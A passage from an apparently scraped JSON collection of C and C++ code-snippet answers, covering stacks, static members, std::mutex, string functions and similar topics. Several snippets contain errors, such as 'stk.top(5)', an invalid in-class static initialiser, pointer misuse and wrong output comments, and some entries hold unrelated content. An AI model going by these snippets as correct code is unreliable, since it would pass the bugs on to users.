    "description": "#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n#include<iostream> using namespace std; #define Max 100 class stack{ \tpublic: \t\tint top; \t\tint size; \t\tint *s; \t\tint stack[Max]; \t\t \t\tvoid push() \t\t{ \t\t\tint value; \t\t\tif(top==size-1) \t\t\t{ \t\t\t\tcout<<\"overflow\"; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tcout<<\"Enter value to push \\n\"; \t\t\t\tcin>>value; \t\t\t\ttop++; \t\t\t\tstack[top]=value; \t\t\t} \t\t} \t\tint pop() \t\t{ \t\t\tif(top==-1) \t\t\t{ \t\t\t\tcout<<\"Underflow\"; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tcout<<\"Deleted value is \\n\"<<stack[top]; \t\t\t\ttop--; \t\t\t} \t\t} \t\tvoid display() \t\t{ \t\t\tint i; \t\t\tfor(i=top;i>=0;i--) \t\t\t{ \t\t\t\tcout<<stack[i]<<endl; \t\t\t} \t\t} }; int main() { \tstack st; \tcout<<\"Enter the size of the stack\"; \tcin>>st.size; \tst.s=new int[st.size]; \tst.top=-1; \tint ch; \twhile(st.size!=0) \t{\t \tcout<<endl<<\"    #####       STACK MENU     #####     \"<<endl; \tcout<<\"1. PUSH OPERATION \\n2. POP OPERATION \\n3. DISPLAY \\n4.Exit \\n\"; \tcin>>ch; \tswitch(ch) \t{ \t\tcase 1:  \t\t    st.push(); \t\t    break; \t\tcase 2: \t\t\tst.pop(); \t\t\tbreak; \t\tcase 3: \t\t\tst.display(); \t\t\tbreak; \t\tcase 4: \t\t\texit(0); \t\t\t \t\tdefault:cout<<\"\\n Choose correct option\"; \t} } return 0; }\n#include <stdio.h>  int MAXSIZE = 8;        int stack[8];      int top = -1;              int isempty() {     if(top == -1)       return 1;    else       return 0; }     int isfull() {     if(top == MAXSIZE)       return 1;    else       return 0; }  int peek() {    return stack[top]; }  int pop() {    int data; \t    if(!isempty()) {       data = stack[top];       top = top - 1;          return data;    } else {       printf(\"Could not retrieve data, Stack is empty.\\n\");    } }  int push(int data) {     if(!isfull()) {       top = top + 1;          stack[top] = data;    } else {       printf(\"Could not insert data, Stack is full.\\n\");    } }  int main() {    // push items on to the stack     push(3);    push(5);    push(9);    push(1);    push(12);    push(15);     printf(\"Element at top of the stack: %d\\n\" ,peek());    printf(\"Elements: \\n\");     // print stack data     while(!isempty()) {       int data = pop();       printf(\"%d\\n\",data);    }     printf(\"Stack full: %s\\n\" , isfull()?\"true\":\"false\");    printf(\"Stack empty: %s\\n\" , isempty()?\"true\":\"false\");        return 0; }\n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3780,
    "keyword": null,
    "link": null,
    "title": " stack in c++",
    "description": "stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n/* Stack is a data structure that provides two O(1) time operations: adding an element to the top and removing an element from the top. It is only possible to access the top element of a stack. */ stack<int> s; s.push(3); s.push(2); s.push(5); cout << s.top(); // 5 s.pop(); cout << s.top(); // 2\n// Fast DIY Stack template<class S, const int N> class Stack { private:     S arr[N];     int top_i;  public:     Stack() : arr(), top_i(-1) {}     void push (S n) {         arr[++top_i] = n;     }     void pop() {         top_i--;     }     S top() {         return arr[top_i];     }     S bottom() {         return arr[0];     }     int size() {         return top_i+1;     } };\n#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#take input 2D vector  vector<vector<int> > v; for(int i=0;i<n;i++){ for(int j=0;j<m;j++){ v[i].push_back(data); }}\n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3781,
    "keyword": null,
    "link": null,
    "title": " stack memory allocation c++",
    "description": "#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New } \t\t\t\t\t\t\nmemory allocation \n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3782,
    "keyword": null,
    "link": null,
    "title": " stack stl",
    "description": "#include <iostream> #include<stack> #include<algorithm>  using namespace std;  int main() {     stack<int>st;     stack<int>st1;     st.push(100);     st.push(90);     st.push(80);     st.push(70);     st.pop();     st1.push(10);     st1.push(20);     st1.push(30);     while(!st.empty())     {         cout<<st.top()<<\" \";         st.pop();     }     cout<<endl;     while(!st1.empty())     {         cout<<st1.top()<<\" \";         st1.pop();     }     cout<<endl;     st.push(100);     st.push(90);     st.push(80);     st.push(70);     st.pop();     st1.push(10);     st1.push(20);     st1.push(30);     st.swap(st1);      while(!st.empty())     {         cout<<st.top()<<\" \";         st.pop();     }     cout<<endl;      while(!st1.empty())     {         cout<<st1.top()<<\" \";         st1.pop();     }     cout<<endl;     return 0; } \nstack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n",
    "reg_date": "2021-10-12T11:43:30.000Z"
  },
  {
    "id": 3783,
    "keyword": null,
    "link": null,
    "title": " stack using linked list",
    "description": "#include <stdio.h> #include <stdlib.h> #define TRUE 1 #define FALSE 0  struct node {     int data;     struct node *next; }; typedef struct node node;  node *top;  void initialize() {     top = NULL; }  void push(int value) {     node *tmp;     tmp = malloc(sizeof(node));     tmp -> data = value;     tmp -> next = top;     top = tmp; }  int pop() {     node *tmp;     int n;     tmp = top;     n = tmp->data;     top = top->next;     free(tmp);     return n; }  int Top() {     return top->data; }  int isempty() {     return top==NULL; }  void display(node *head) {     if(head == NULL)     {         printf(\"NULL\\n\");     }     else     {         printf(\"%d\\n\", head -> data);         display(head->next);     } }  int main() {     initialize();     push(10);     push(20);     push(30);     printf(\"The top is %d\\n\",Top());     pop();     printf(\"The top after pop is %d\\n\",Top());     display(top);     return 0; } \n/*  * C Program to Implement a Stack using Linked List  */ #include <stdio.h> #include <stdlib.h>   struct node {     int info;     struct node *ptr; }*top,*top1,*temp;   int topelement(); void push(int data); void pop(); void empty(); void display(); void destroy(); void stack_count(); void create();   int count = 0;   void main() {     int no, ch, e;       printf(\"\\n 1 - Push\");     printf(\"\\n 2 - Pop\");     printf(\"\\n 3 - Top\");     printf(\"\\n 4 - Empty\");     printf(\"\\n 5 - Exit\");     printf(\"\\n 6 - Dipslay\");     printf(\"\\n 7 - Stack Count\");     printf(\"\\n 8 - Destroy stack\");       create();       while (1)     {         printf(\"\\n Enter choice : \");         scanf(\"%d\", &ch);           switch (ch)         {         case 1:             printf(\"Enter data : \");             scanf(\"%d\", &no);             push(no);             break;         case 2:             pop();             break;         case 3:             if (top == NULL)                 printf(\"No elements in stack\");             else             {                 e = topelement();                 printf(\"\\n Top element : %d\", e);             }             break;         case 4:             empty();             break;         case 5:             exit(0);         case 6:             display();             break;         case 7:             stack_count();             break;         case 8:             destroy();             break;         default :             printf(\" Wrong choice, Please enter correct choice  \");             break;         }     } }   /* Create empty stack */ void create() {     top = NULL; }   /* Count stack elements */ void stack_count() {     printf(\"\\n No. of elements in stack : %d\", count); }   /* Push data into stack */ void push(int data) {     if (top == NULL)     {         top =(struct node *)malloc(1*sizeof(struct node));         top->ptr = NULL;         top->info = data;     }     else     {         temp =(struct node *)malloc(1*sizeof(struct node));         temp->ptr = top;         temp->info = data;         top = temp;     }     count++; }   /* Display stack elements */ void display() {     top1 = top;       if (top1 == NULL)     {         printf(\"Stack is empty\");         return;     }       while (top1 != NULL)     {         printf(\"%d \", top1->info);         top1 = top1->ptr;     }  }   /* Pop Operation on stack */ void pop() {     top1 = top;       if (top1 == NULL)     {         printf(\"\\n Error : Trying to pop from empty stack\");         return;     }     else         top1 = top1->ptr;     printf(\"\\n Popped value : %d\", top->info);     free(top);     top = top1;     count--; }   /* Return top element */ int topelement() {     return(top->info); }   /* Check if stack is empty or not */ void empty() {     if (top == NULL)         printf(\"\\n Stack is empty\");     else         printf(\"\\n Stack is not empty with %d elements\", count); }   /* Destroy entire stack */ void destroy() {     top1 = top;       while (top1 != NULL)     {         top1 = top->ptr;         free(top);         top = top1;         top1 = top1->ptr;     }     free(top1);     top = NULL;       printf(\"\\n All stack elements destroyed\");     count = 0; }\n/// Stack using Linked List /// we are using single Linked List and manage using head pointer not tail #include <bits/stdc++.h> using namespace std;  /*****************************/  // Template T is generic class which work for any datatype. template <typename T>  class Node {  public:   T data;   Node<T> *next;    Node(T data) : data(data), next(NULL) {} };  //--------------------------------  template <typename T>  class Stack {   Node<T> *head;   int size{0};   public:   Stack() {     head = NULL;     size = 0;   }    //-------------------------------- getSize()   - O(1)    int getSize() { return size; }    //---------------------------------- isEmpty() - O(1)      bool isEmpty() {     if (head == NULL) {       return true;     }     return false;   }   //---------------------------------- push() - O(1)    void push(int data) {     Node<T> *temp = new Node<T>(data);     temp->next = head;     head = temp;     size++;   }    //--------------------------------- pop() - O(1)   void pop() {     if (head == NULL) {       cout << \"==============\" << endl;       cout << \"STACK EMPTY!!!\" << endl;       cout << \"==============\" << endl;       return;     }      Node<T> *temp = head;     head = head->next;      /// free node - isolation step     temp->next = NULL;     delete temp;     size--;   }    //---------------------------------- top_element()  - O(1)    T top() {     if (head == NULL) {       cout << \"==============\" << endl;       cout << \"STACK EMPTY!!!\" << endl;       cout << \"==============\" << endl;       return 0;     }      return head->data;   } };  /*****************************/  int main() {      Stack<int> s;   s.push(10);   s.push(20);   s.push(30);   s.push(40);   s.push(50);     cout << s.getSize() << endl;   cout << s.top() << endl;   s.pop();  }\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3784,
    "keyword": null,
    "link": null,
    "title": " standard deviation function in c++",
    "description": "#include<iostream> #include<cmath> using namespace std; int main(int argc, char const *argv[]) {     double mean;     double nums[] = {9, 2, 5, 4, 12, 7, 8, 11, 9, 3, 7, 4, 12, 5, 4, 10, 9, 6, 9, 4};     double standardDeviation = 0;     double arraySize = *(&nums + 1) - nums;      for (int i = 0; i < arraySize; i++){ mean = (nums[i] + mean);}     mean = mean/ arraySize;     for (int i = 0; i < arraySize; i++){         standardDeviation += pow((nums[i] - mean), 2);     }     standardDeviation = sqrt(standardDeviation / arraySize);     cout << standardDeviation << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3785,
    "keyword": null,
    "link": null,
    "title": " star pyramid pattern",
    "description": "#include <iostream> using namespace std;  int main() {     int rows;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 1; i <= rows; ++i)     {         for(int j = 1; j <= i; ++j)         {             cout << \"* \";         }         cout << \"\\n\";     }     return 0; } \n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3786,
    "keyword": null,
    "link": null,
    "title": " statement that causes a function to end in c++",
    "description": "Return statement. The return statement stops execution and returns to the calling function. When a return statement is executed, the function is terminated immediately at that point, regardless of whether it's in the middle of a loop, etc. \n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3787,
    "keyword": null,
    "link": null,
    "title": " static",
    "description": "A static method belongs to the class rather than the object. There is no need to create the object to call the static methods. A static method can access and change the value of the static variable\nStatic is a keyword in C++ used to give special characteristics to an element. Static elements are allocated storage only once in a program lifetime in static storage area. And they have a scope till the program lifetime. Static Keyword can be used with following,  Static variable in functions Static Class Objects Static member Variable in class Static Methods in class\nfrom django.conf.urls.static import static\n$ sudo nmcli connection show enp0s3...connection.id: enp0s3connection.uuid: a6fc257b-5894-4437-a35e-382c06b27e46connection.stable-id: --connection.type: 802-3-ethernetconnection.interface-name: enp0s3connection.autoconnect: yes...ipv4.method: auto...IP4.ADDRESS[1]: 10.0.2.15/24IP4.GATEWAY: 10.0.2.2IP4.ROUTE[1]: dst = 0.0.0.0/0, nh = 10.0.2.2, mt = 100IP4.ROUTE[2]: dst = 10.0.2.0/24, nh = 0.0.0.0, mt = 100IP4.DNS[1]: 10.0.1.1\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3788,
    "keyword": null,
    "link": null,
    "title": " static  in class c++",
    "description": "#include <iostream>  class Entity { public: \tstatic int  x,y; \tstatic void Print() { \t\tstd::cout << x << \", \" << y << std::endl; \t}// sta1tic methods can't access class non-static members }; int Entity:: x; int Entity:: y;// variable x and y are just in a name space and we declared them here int main() { \tEntity e; \tEntity e1; \te.x = 5; \te.y = 6; \te1.x = 10; \te1.y = 10; \te.Print();//output => 10 because variable x and y being static point to same block of memory \te1.Print();//output => 10 because variable x and y being static point to same block of memory \tEntity::x;\t//you can also acess static variables and functions like this without creating an instance     Entity::Print();\t//you can also acess static variables and functions like this without creating an instance \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3789,
    "keyword": null,
    "link": null,
    "title": " static cast c++",
    "description": "static_cast conversion  C++ C++ language Expressions  Converts between types using a combination of implicit and user-defined conversions.  Syntax static_cast < new_type > ( expression )\t\t Returns a value of type new_type.\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3790,
    "keyword": null,
    "link": null,
    "title": " static cast char c++",
    "description": "static_cast<char>(expression);\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3791,
    "keyword": null,
    "link": null,
    "title": " static class in C++",
    "description": "#include <iostream>  class Entity { public: \tstatic int  x,y; \tstatic void Print() { \t\tstd::cout << x << \", \" << y << std::endl; \t}// sta1tic methods can't access class non-static members }; int Entity:: x; int Entity:: y;// variable x and y are just in a name space and we declared them here int main() { \tEntity e; \tEntity e1; \te.x = 5; \te.y = 6; \te1.x = 10; \te1.y = 10; \te.Print();//output => 10 because variable x and y being static point to same block of memory \te1.Print();//output => 10 because variable x and y being static point to same block of memory \tEntity::x;\t//you can also acess static variables and functions like this without creating an instance     Entity::Print();\t//you can also acess static variables and functions like this without creating an instance \tstd::cin.get(); }\n#include <iostream>   using namespace std;  class Box {    public:       static int objectCount;              // Constructor definition       Box(double l = 2.0, double b = 2.0, double h = 2.0) {          cout <<\"Constructor called.\" << endl;          length = l;          breadth = b;          height = h;           // Increase every time object is created          objectCount++;       }       double Volume() {          return length * breadth * height;       }       static int getCount() {          return objectCount;       }           private:       double length;     // Length of a box       double breadth;    // Breadth of a box       double height;     // Height of a box };  // Initialize static member of class Box int Box::objectCount = 0;  int main(void) {    // Print total number of objects before creating object.    cout << \"Inital Stage Count: \" << Box::getCount() << endl;     Box Box1(3.3, 1.2, 1.5);    // Declare box1    Box Box2(8.5, 6.0, 2.0);    // Declare box2     // Print total number of objects after creating object.    cout << \"Final Stage Count: \" << Box::getCount() << endl;     return 0; }\n#include <iostream>   using namespace std;  class Box {    public:       static int objectCount;              // Constructor definition       Box(double l = 2.0, double b = 2.0, double h = 2.0) {          cout <<\"Constructor called.\" << endl;          length = l;          breadth = b;          height = h;                    // Increase every time object is created          objectCount++;       }       double Volume() {          return length * breadth * height;       }           private:       double length;     // Length of a box       double breadth;    // Breadth of a box       double height;     // Height of a box };  // Initialize static member of class Box int Box::objectCount = 0;  int main(void) {    Box Box1(3.3, 1.2, 1.5);    // Declare box1    Box Box2(8.5, 6.0, 2.0);    // Declare box2     // Print total number of objects.    cout << \"Total objects: \" << Box::objectCount << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3792,
    "keyword": null,
    "link": null,
    "title": " static inside local scope in c++",
    "description": "#include<iostream> //Singleton class is a class having only one instance class SingleTon {  public: \tstatic SingleTon& Get() { \t\tstatic SingleTon s_Instance; \t\treturn s_Instance; \t}//there is only one instance of static functions and variables across all instances of class \tvoid Hellow() {} }; void Increment() { \tint i = 0;//The life time of variable is limited to the function scope \ti++; \tstd::cout << i << std::endl; };//This will increment i to one and when it will reach the end bracket the lifetime of var will get  destroyed void IncrementStaticVar() { \tstatic int i = 0;//The life time of this var is = to program \ti++; \tstd::cout << i << std::endl; }//This will increment i till the program ends int main() { \t \tIncrement();//output 1 \tIncrement();//output 1 \tIncrement();//output 1 \tIncrementStaticVar();// output 2 \tIncrementStaticVar();// output 3 \tIncrementStaticVar();// output 4 \tIncrementStaticVar();// output 5 \tSingleTon::Get(); \tstd::cin.get();  }\n",
    "reg_date": "2021-10-12T11:43:31.000Z"
  },
  {
    "id": 3793,
    "keyword": null,
    "link": null,
    "title": " static variable in c++",
    "description": "/* this example show where and how static variables are used */  #include <iostream> #include <string>  //doing \"using namespace std\" is generally a bad practice, this is an exception using namespace std;  class Player {   int health = 200;   string name = \"Name\";      //static keyword    static int count = 0; public:   //constructor   Player(string set_name)     :name{set_name}   {     count++;   }      //destructor   ~Player()   {     count--;   }      int how_many_player_are_there()   {     return count;   }    };  int main() {   Player* a = new Player(\"some name\");   cout << \"Player count: \" << *a.how_many_player_are_there() << std::endl;      Player* b = new Player(\"some name\");   cout << \"Player count: \" << *a.how_many_player_are_there() << std::endl;      delete a;      cout << \"Player count: \" << *b.how_many_player_are_there() << std::endl; }  /*output: 1 2 1 */\n#include<iostream> //Singleton class is a class having only one instance class SingleTon {  public: \tstatic SingleTon& Get() { \t\tstatic SingleTon s_Instance; \t\treturn s_Instance; \t}//there is only one instance of static functions and variables across all instances of class \tvoid Hellow() {} }; void Increment() { \tint i = 0;//The life time of variable is limited to the function scope \ti++; \tstd::cout << i << std::endl; };//This will increment i to one and when it will reach the end bracket the lifetime of var will get  destroyed void IncrementStaticVar() { \tstatic int i = 0;//The life time of this var is = to program \ti++; \tstd::cout << i << std::endl; }//This will increment i till the program ends int main() { \t \tIncrement();//output 1 \tIncrement();//output 1 \tIncrement();//output 1 \tIncrementStaticVar();// output 2 \tIncrementStaticVar();// output 3 \tIncrementStaticVar();// output 4 \tIncrementStaticVar();// output 5 \tSingleTon::Get(); \tstd::cin.get();  }\n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3794,
    "keyword": null,
    "link": null,
    "title": " std::bad array new length",
    "description": "std::bad_array_new_length is the type of the object thrown as exceptions by the new-expressions to report invalid array lengths if  1) array length is negative 2) total size of the new array would exceed implementation-defined maximum value 3) the number of initializer-clauses exceeds the number of elements to initialize  Only the first array dimension may generate this exception; dimensions other than the first are constant expressions and are checked at compile time.\n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3795,
    "keyword": null,
    "link": null,
    "title": " std::cout and cout",
    "description": "//c++ cout and std::cout both are same, but the only difference is that if we  use cout, namespace std must be used in the program or if you are not  using std namespace then you should use std::cout.\n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3796,
    "keyword": null,
    "link": null,
    "title": " std::gcd",
    "description": "cout << __gcd(17, 97) << endl; //#include <algorithm>  \n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3797,
    "keyword": null,
    "link": null,
    "title": " std::iomanip c++",
    "description": "// setfill example #include <iostream>     // std::cout, std::endl #include <iomanip>      // std::setfill, std::setw  int main () {   std::cout << std::setfill ('x') << std::setw (10);   std::cout << 77 << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3798,
    "keyword": null,
    "link": null,
    "title": " std::is standard layout",
    "description": "// note: applied recursively to all members bool is_pod(T) { return is_standard_layout(T) && is_trivial(T); } \n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3799,
    "keyword": null,
    "link": null,
    "title": " std::make shared<>",
    "description": "// make_shared example #include <iostream> #include <memory>  int main () {    std::shared_ptr<int> foo = std::make_shared<int> (10);   // same as:   std::shared_ptr<int> foo2 (new int(10));    auto bar = std::make_shared<int> (20);    auto baz = std::make_shared<std::pair<int,int>> (30,40);    std::cout << \"*foo: \" << *foo << '\\n';   std::cout << \"*bar: \" << *bar << '\\n';   std::cout << \"*baz: \" << baz->first << ' ' << baz->second << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3800,
    "keyword": null,
    "link": null,
    "title": " std::map get all keys",
    "description": "std::map<int, int> m; std::vector<int> key, value; for(std::map<int,int>::iterator it = m.begin(); it != m.end(); ++it) {   key.push_back(it->first);   value.push_back(it->second);   std::cout << \"Key: \" << it->first << std::endl();   std::cout << \"Value: \" << it->second << std::endl(); } \n",
    "reg_date": "2021-10-12T11:43:32.000Z"
  },
  {
    "id": 3801,
    "keyword": null,
    "link": null,
    "title": " std::mutex",
    "description": "#include <iostream> #include <map> #include <string> #include <chrono> #include <thread> #include <mutex>   std::map<std::string, std::string> g_pages; std::mutex g_pages_mutex;   void save_page(const std::string &url) {     // simulate a long page fetch     std::this_thread::sleep_for(std::chrono::seconds(2));     std::string result = \"fake content\";       std::lock_guard<std::mutex> guard(g_pages_mutex);     g_pages[url] = result; }   int main()  {     std::thread t1(save_page, \"http://foo\");     std::thread t2(save_page, \"http://bar\");     t1.join();     t2.join();       // safe to access g_pages without lock now, as the threads are joined     for (const auto &pair : g_pages) {         std::cout << pair.first << \" => \" << pair.second << '\\n';     } }\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3802,
    "keyword": null,
    "link": null,
    "title": " std::ofstream file1(FILE NAME, std::ios::app);",
    "description": "std::ofstream file1(FILE_NAME, std::ios::app);  \\\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3803,
    "keyword": null,
    "link": null,
    "title": " std::random device",
    "description": "std::random_device rd; std::mt19937 e{rd()}; // or std::default_random_engine e{rd()}; std::uniform_int_distribution<int> dist{1, 5};  // get random numbers with: dist(e); \n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3804,
    "keyword": null,
    "link": null,
    "title": " std::reverse",
    "description": "    std::vector<int> v{1,2,3};     std::reverse(std::begin(v), std::end(v));\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3805,
    "keyword": null,
    "link": null,
    "title": " std::set remove item",
    "description": "std::set<int> myset; myset.erase(value);\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3806,
    "keyword": null,
    "link": null,
    "title": " std::string(size t , char ) constructor:",
    "description": "string (const string& str, size_t pos, size_t len = npos); \nstring(); \nstring (const char* s, size_t n); \nstring (const string& str); \nstring (size_t n, char c); \ntemplate <class InputIterator>   string  (InputIterator first, InputIterator last); \n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3807,
    "keyword": null,
    "link": null,
    "title": " std::string to qstring",
    "description": "QString str = QString::fromUtf8(content.c_str());\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3808,
    "keyword": null,
    "link": null,
    "title": " std::substring",
    "description": "// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3809,
    "keyword": null,
    "link": null,
    "title": " std::tuple apply multiplier",
    "description": "you can't without some special magic\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3810,
    "keyword": null,
    "link": null,
    "title": " std::vector<const char *>",
    "description": "std::vector<const char *>\n",
    "reg_date": "2021-10-12T11:43:33.000Z"
  },
  {
    "id": 3811,
    "keyword": null,
    "link": null,
    "title": " std ::endl",
    "description": "#include <iostream> #include <chrono>   template<typename Diff> void log_progress(Diff d) {     std::cout << std::chrono::duration_cast<std::chrono::milliseconds>(d).count()               << \" ms passed\" << std::endl; }   int main() {     std::cout.sync_with_stdio(false); // on some platforms, stdout flushes on \\n     volatile int sink = 0;       auto t1 = std::chrono::high_resolution_clock::now();     for (int j=0; j<5; ++j)     {         for (int n=0; n<10000; ++n)             for (int m=0; m<20000; ++m)                 sink += m*n; // do some work         auto now = std::chrono::high_resolution_clock::now();         log_progress(now - t1);     } }\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3812,
    "keyword": null,
    "link": null,
    "title": " std array c++",
    "description": "#include <iostream> #include <array> using namespace std;  int main () {     const int size = 5;     array<int, size> numbers; // create stl array template     array<int, size> :: iterator NUMBER_ITERATOR; // declare iterator that points to stl template numbahs      NUMBER_ITERATOR = numbers.begin(); // points iterator to first element in array template      cout << \"Please fill the array: \\n\";     for(;NUMBER_ITERATOR != numbers.end(); NUMBER_ITERATOR++) cin >> *NUMBER_ITERATOR; // enter the value for each element one-by-one      NUMBER_ITERATOR = numbers.begin(); // reset the pointer to first element     cout << \"Displaying array: \\n\";      for(;NUMBER_ITERATOR != numbers.end(); NUMBER_ITERATOR++) cout << *NUMBER_ITERATOR << \"\\n\"; // prints out value for each     cout << endl;      return 0; }\n#include <bits/stdc++.h> using namespace std;   main() {     array<string, 3> a1{\"a\", \"b\", \"c\"};  \tarray<int, 5> a2;   \tcout<<a1[0]<<endl;     //size of array     cout<<a1.size()<<endl;        //Sorts the elements \tsort(a1.begin(), a1.end());     for(auto& i: a1) {     \tcout << i << ' ';     } }\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3813,
    "keyword": null,
    "link": null,
    "title": " std bind",
    "description": "// C++ callback function  class Base { public:   void doSomething() {     using namespace std::placeholders;     // std::placeholders::_1 is for the callback parameter     // use _1 for 1 argument     // or _1, _2, _3 for 3 arguments and so on     something.setCallback(std::bind(&Base::callback, this, _1));     // std::bind is needed, otherwise      // the callback function would need to be static   }      // Callback function   void callback(int i) {     std::cout << \"Callback: \" << i << std::endl;   } }\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3814,
    "keyword": null,
    "link": null,
    "title": " std cout c++",
    "description": "#include <iostream>  using namespace std;  int main() { \tint a,b; \tchar str[] = \"Hello Programmers\"; \t \t/* Single insertion operator */ \tcout << \"Enter 2 numbers - \"; \tcin >> a >> b; \tcout << str; \tcout << endl; \t \t/* Multiple insertion operator */ \tcout << \"Value of a is \" << a << endl << \"Value of b is \" << b; \t \treturn 0; }\n#include <iostream> using std::cout; int main() {    \tcout<<\"Hello world\";     return 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n//c++ cout and std::cout both are same, but the only difference is that if we  use cout, namespace std must be used in the program or if you are not  using std namespace then you should use std::cout.\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3815,
    "keyword": null,
    "link": null,
    "title": " std distance",
